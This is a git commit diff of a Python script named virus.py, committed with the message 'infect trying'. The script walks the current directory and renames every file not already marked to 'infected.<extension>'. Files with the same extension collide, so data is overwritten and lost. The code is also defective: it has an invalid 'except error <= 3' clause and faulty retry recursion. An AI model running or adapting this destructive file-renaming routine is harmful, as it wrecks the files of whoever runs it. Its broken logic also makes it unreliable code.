cfe4724e95437cd559d20b541c9a1cd328015b02
dfop02 <dfop02@hotmail.com>
2018-08-10 11:32:35 -0300

    infect trying

--- virus.py
+++ virus.py
@@ -1,18 +1,31 @@
 from __future__ import print_function
 import os, time
 
-def search():
-	for filename in os.listdir("."):
-		infect(filename)
+def search(path="."):
+	normalFiles = set() # set of uninfected file names
+	for filename in os.listdir(path): # gets a list of file names in a given path
+		print (filename, end='')
+		if filename.startswith("infected"):
+			print (" infected")
+		else:
+			print (" not infected yet... Infecting...")
+			normalFiles.add(filename)
+	return normalFiles
 
-def infect(filename):
-	print (filename, end='')
-	if filename.startswith("infected"):
-		print (" infected")
-	else:
-		print (" not infected yet...", end='')
-		time.sleep(5)
-		print (" Infecting...")
-		#os.rename(filename, "infected")
+def infect(filelist):
+	error = 0
+	print ("")
+	for filename in filelist:
+		print ("Infecting... " + filename)
+		try:
+			os.rename(filename, "infected." + str(filename.split(".")[-1]))
+		except error <= 3:
+			print ("Infect failed... Trying again...")
+			infect(search())
+			error += 1
 
-search()
+filelist = search()
+
+print (filelist)
+
+infect(filelist)
